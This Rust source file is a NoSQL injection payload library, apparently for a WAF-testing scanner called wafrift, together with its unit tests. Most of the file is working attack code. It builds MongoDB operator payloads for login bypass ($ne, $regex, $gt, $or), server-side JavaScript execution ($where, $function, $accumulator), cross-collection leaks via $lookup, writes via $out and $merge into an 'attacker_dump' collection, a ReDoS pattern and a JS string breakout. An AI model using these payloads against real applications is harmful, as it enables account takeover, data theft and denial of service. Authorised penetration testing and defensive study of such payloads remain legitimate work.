//! MongoDB NoSQL operator-injection payload library.
//!
//! MongoDB queries are JSON objects. When user input becomes a field
//! VALUE in a query (`{ "user": req.body.user, "password":
//! req.body.password }`), an attacker controlling `req.body.user`
//! can submit `{ "$ne": "" }` and turn the equality check into
//! "not-equal-to-empty-string" — every row passes.
//!
//! Distinct from `wafrift_grammar::mongo` (which generates valid
//! query SHAPES the engine accepts), this library generates the
//! ATTACKER-VALUE payloads that get DROPPED INTO an existing
//! application-controlled query.
//!
//! Coverage:
//!
//! - **`$ne`** — auth bypass.
//! - **`$gt` / `$lt` / `$gte` / `$lte` / `$in` / `$nin` / `$exists`** —
//!   comparison-operator bypass family.
//! - **`$regex`** — `.*` for "anything"; complex regex for ReDoS.
//! - **`$where`** — server-side JS evaluation (RCE-class on older
//!   Mongo with shell-access drivers).
//! - **`$function`** — replacement for `$where` in Mongo 4.4+ — JS
//!   body executes server-side.
//! - **`$accumulator`** — JS execution inside aggregation pipeline.
//! - **`$elemMatch`** — array auth bypass when the field is an array.
//! - **`$or` / `$and`** — combine attacker-controlled clauses.
//! - **Projection injection** — `$slice`, `$elemMatch` in
//!   projection clause exposes hidden fields.
//! - **Aggregation injection** — `$lookup` (cross-collection join /
//!   SSRF on hash-based shards), `$out` / `$merge` (arbitrary write).
//! - **String JS injection** — when the application stringifies the
//!   query, inject `'; return this; var x='`.

use serde_json::{Value, json};

/// `$ne` auth bypass. Returns the JSON value `{"$ne":""}` —
/// callers drop it into a query field.
#[must_use]
pub fn ne_bypass() -> Value {
    json!({"$ne": ""})
}

/// `$gt` returns `{"$gt": ""}` — same shape, different operator.
#[must_use]
pub fn gt_bypass() -> Value {
    json!({"$gt": ""})
}

/// `$regex: ".*"` — matches anything. Auth bypass when the
/// application checks `{username: req.body.username, password:
/// req.body.password}`.
#[must_use]
pub fn regex_anything() -> Value {
    json!({"$regex": ".*"})
}

/// `$regex` ReDoS payload — exponential backtracking on
/// vulnerable input.
#[must_use]
pub fn regex_redos() -> Value {
    json!({"$regex": "(a+)+$"})
}

/// `$where` JS evaluation. The string is evaluated server-side as
/// JavaScript with `this` bound to the document. Auth bypass:
/// `$where: "true"`. Data exfil: `$where: "this.email.match(/^a/)"`.
///
/// Newer MongoDB versions disable `$where` by default; check with
/// `$function` if disabled.
#[must_use]
pub fn where_js(js: &str) -> Value {
    json!({"$where": js})
}

/// `$function` JS evaluation (Mongo 4.4+). Body is JavaScript; args
/// is the array of input values bound to the function arguments;
/// lang must be `"js"`.
#[must_use]
pub fn function_js(body: &str, args: &[Value]) -> Value {
    json!({
        "$function": {
            "body": body,
            "args": args,
            "lang": "js"
        }
    })
}

/// `$accumulator` — JS execution inside aggregation. More obscure
/// than `$function`; some WAFs miss it entirely.
#[must_use]
pub fn accumulator_js(init: &str, accumulate: &str) -> Value {
    json!({
        "$accumulator": {
            "init": init,
            "accumulate": accumulate,
            "accumulateArgs": [],
            "merge": "function(s1, s2) { return s1; }",
            "lang": "js"
        }
    })
}

/// `$elemMatch` array-auth bypass. When the user document's
/// `roles` field is an array of role strings, this matches if
/// ANY element matches — defeats "admin not in roles" checks
/// that filter on the entire array.
#[must_use]
pub fn elem_match(inner_op: &str, inner_value: Value) -> Value {
    json!({
        "$elemMatch": {
            inner_op: inner_value
        }
    })
}

/// `$or` injection — splice in attacker-controlled clauses
/// alongside the legitimate filter.
#[must_use]
pub fn or_injection(legit_clause: Value, attacker_clause: Value) -> Value {
    json!({
        "$or": [legit_clause, attacker_clause]
    })
}

/// Projection injection. Reveals the password / token / hidden
/// field by including it in the projection from an attacker-
/// controlled query parameter.
#[must_use]
pub fn projection_inject(field: &str) -> Value {
    json!({
        field: 1
    })
}

/// `$lookup` cross-collection injection — when the application
/// builds an aggregation pipeline including attacker-controlled
/// stages, `$lookup` exposes other collections.
#[must_use]
pub fn lookup_inject(from_collection: &str, local_field: &str, foreign_field: &str) -> Value {
    json!({
        "$lookup": {
            "from": from_collection,
            "localField": local_field,
            "foreignField": foreign_field,
            "as": "leaked"
        }
    })
}

/// `$out` write-to-collection injection — pipeline writes its
/// result into a new collection. Attacker can dump the entire
/// user database into a public-readable collection.
#[must_use]
pub fn out_write(target_collection: &str) -> Value {
    json!({
        "$out": target_collection
    })
}

/// `$merge` write injection — Mongo 4.2+ — like `$out` but doesn't
/// drop the target first.
#[must_use]
pub fn merge_write(target_collection: &str) -> Value {
    json!({
        "$merge": {
            "into": target_collection,
            "whenMatched": "merge",
            "whenNotMatched": "insert"
        }
    })
}

/// String-context JS injection — when the application
/// stringifies the query and uses `eval` (or builds JS dynamically
/// via the deprecated `db.collection.find(query_string)` form).
#[must_use]
pub fn js_string_injection() -> &'static str {
    "'; return true; var x='"
}

/// Build a comprehensive auth-bypass body the operator POSTs as
/// `Content-Type: application/json` to the login endpoint.
#[must_use]
pub fn login_auth_bypass(username_field: &str, password_field: &str) -> String {
    let body = json!({
        username_field: { "$ne": "" },
        password_field: { "$ne": "" }
    });
    body.to_string()
}

/// Build a comprehensive auth-bypass body using `$regex` instead
/// of `$ne` — bypasses WAFs that only blocklist `$ne`.
#[must_use]
pub fn login_regex_bypass(username_field: &str, password_field: &str) -> String {
    let body = json!({
        username_field: { "$regex": ".*" },
        password_field: { "$regex": ".*" }
    });
    body.to_string()
}

/// One-shot fan-out: every NoSQLi injection shape for one (auth
/// field) pair. Used by `wafrift scan --nosqli`.
#[must_use]
pub fn all_nosqli_variants(username_field: &str, password_field: &str) -> Vec<(&'static str, String)> {
    vec![
        ("ne-bypass", login_auth_bypass(username_field, password_field)),
        ("regex-anything", login_regex_bypass(username_field, password_field)),
        (
            "gt-bypass",
            json!({ username_field: { "$gt": "" } }).to_string(),
        ),
        (
            "where-js",
            json!({ "$where": format!("this.{username_field} == this.{password_field}") }).to_string(),
        ),
        (
            "function-js",
            function_js("function() { return true; }", &[]).to_string(),
        ),
        (
            "or-injection",
            or_injection(
                json!({ username_field: "admin" }),
                json!({ password_field: { "$ne": "" } }),
            )
            .to_string(),
        ),
        (
            "elem-match",
            json!({ "roles": elem_match("$eq", json!("admin")) }).to_string(),
        ),
        (
            "regex-redos",
            json!({ username_field: regex_redos() }).to_string(),
        ),
        (
            "accumulator-js",
            accumulator_js("function() { return 0; }", "function(s, v) { return s + 1; }")
                .to_string(),
        ),
        (
            "lookup-leak",
            json!([lookup_inject("users", "_id", "_id")]).to_string(),
        ),
        (
            "out-write",
            json!([out_write("attacker_dump")]).to_string(),
        ),
        (
            "merge-write",
            json!([merge_write("attacker_dump")]).to_string(),
        ),
        ("js-string", js_string_injection().to_string()),
        (
            "projection-password",
            projection_inject(password_field).to_string(),
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ne_bypass_structure() {
        let v = ne_bypass();
        assert_eq!(v["$ne"], "");
    }

    #[test]
    fn gt_bypass_structure() {
        let v = gt_bypass();
        assert_eq!(v["$gt"], "");
    }

    #[test]
    fn regex_anything_basic() {
        let v = regex_anything();
        assert_eq!(v["$regex"], ".*");
    }

    #[test]
    fn regex_redos_known_pattern() {
        let v = regex_redos();
        assert!(v["$regex"].as_str().unwrap().contains("(a+)+"));
    }

    #[test]
    fn where_js_basic() {
        let v = where_js("this.x == 1");
        assert_eq!(v["$where"], "this.x == 1");
    }

    #[test]
    fn function_js_structure() {
        let v = function_js("function() { return true; }", &[]);
        assert_eq!(v["$function"]["body"], "function() { return true; }");
        assert_eq!(v["$function"]["lang"], "js");
        assert!(v["$function"]["args"].is_array());
    }

    #[test]
    fn function_js_with_args() {
        let v = function_js("function(a) { return a; }", &[json!("hello")]);
        assert_eq!(v["$function"]["args"][0], "hello");
    }

    #[test]
    fn accumulator_js_required_fields() {
        let v = accumulator_js("function() { return 0; }", "function(s, v) { return s + 1; }");
        let a = &v["$accumulator"];
        assert!(a["init"].is_string());
        assert!(a["accumulate"].is_string());
        assert!(a["accumulateArgs"].is_array());
        assert!(a["merge"].is_string());
        assert_eq!(a["lang"], "js");
    }

    #[test]
    fn elem_match_basic() {
        let v = elem_match("$eq", json!("admin"));
        assert_eq!(v["$elemMatch"]["$eq"], "admin");
    }

    #[test]
    fn or_injection_two_clauses() {
        let v = or_injection(json!({"a": 1}), json!({"b": {"$ne": ""}}));
        assert!(v["$or"].is_array());
        let arr = v["$or"].as_array().unwrap();
        assert_eq!(arr.len(), 2);
        assert_eq!(arr[0]["a"], 1);
    }

    #[test]
    fn projection_inject_one_field() {
        let v = projection_inject("password");
        assert_eq!(v["password"], 1);
    }

    #[test]
    fn lookup_inject_structure() {
        let v = lookup_inject("admin_users", "user_id", "_id");
        assert_eq!(v["$lookup"]["from"], "admin_users");
        assert_eq!(v["$lookup"]["localField"], "user_id");
        assert_eq!(v["$lookup"]["foreignField"], "_id");
        assert_eq!(v["$lookup"]["as"], "leaked");
    }

    #[test]
    fn out_write_basic() {
        let v = out_write("attacker_dump");
        assert_eq!(v["$out"], "attacker_dump");
    }

    #[test]
    fn merge_write_default_when_matched() {
        let v = merge_write("attacker_dump");
        assert_eq!(v["$merge"]["into"], "attacker_dump");
        assert_eq!(v["$merge"]["whenMatched"], "merge");
        assert_eq!(v["$merge"]["whenNotMatched"], "insert");
    }

    #[test]
    fn js_string_injection_contains_return() {
        let s = js_string_injection();
        assert!(s.contains("return true"));
    }

    #[test]
    fn login_auth_bypass_well_formed_json() {
        let body = login_auth_bypass("username", "password");
        let parsed: Value = serde_json::from_str(&body).expect("valid JSON");
        assert_eq!(parsed["username"]["$ne"], "");
        assert_eq!(parsed["password"]["$ne"], "");
    }

    #[test]
    fn login_regex_bypass_well_formed_json() {
        let body = login_regex_bypass("u", "p");
        let parsed: Value = serde_json::from_str(&body).expect("valid JSON");
        assert_eq!(parsed["u"]["$regex"], ".*");
    }

    #[test]
    fn all_nosqli_minimum_count() {
        let v = all_nosqli_variants("username", "password");
        assert!(v.len() >= 12);
    }

    #[test]
    fn all_nosqli_unique_names() {
        let v = all_nosqli_variants("u", "p");
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), v.len());
    }

    #[test]
    fn all_nosqli_carries_field_names() {
        let v = all_nosqli_variants("USERNAME_MARKER", "PASSWORD_MARKER");
        let any_carries_user = v.iter().any(|(_, p)| p.contains("USERNAME_MARKER"));
        let any_carries_pass = v.iter().any(|(_, p)| p.contains("PASSWORD_MARKER"));
        assert!(any_carries_user);
        assert!(any_carries_pass);
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_nosqli_variants("u", "p");
        let b = all_nosqli_variants("u", "p");
        assert_eq!(a, b);
    }

    #[test]
    fn adversarial_long_field_no_panic() {
        let big = "a".repeat(10_000);
        let _ = login_auth_bypass(&big, &big);
        let _ = all_nosqli_variants(&big, &big);
    }

    #[test]
    fn unicode_field_names() {
        let body = login_auth_bypass("Ñame", "пароль");
        let parsed: Value = serde_json::from_str(&body).expect("valid");
        assert!(parsed.get("Ñame").is_some());
        assert!(parsed.get("пароль").is_some());
    }

    #[test]
    fn each_json_variant_parses() {
        let v = all_nosqli_variants("u", "p");
        for (name, payload) in &v {
            // Skip the literal JS-string variant (not JSON).
            if name == &"js-string" {
                continue;
            }
            let parsed: Result<Value, _> = serde_json::from_str(payload);
            assert!(
                parsed.is_ok(),
                "variant {name} not valid JSON: {payload}"
            );
        }
    }

    #[test]
    fn or_injection_preserves_legit_field() {
        let v = or_injection(json!({"name": "admin"}), json!({"admin_token": {"$ne": ""}}));
        // Both clauses preserved.
        let arr = v["$or"].as_array().unwrap();
        assert_eq!(arr[0]["name"], "admin");
        assert_eq!(arr[1]["admin_token"]["$ne"], "");
    }
}
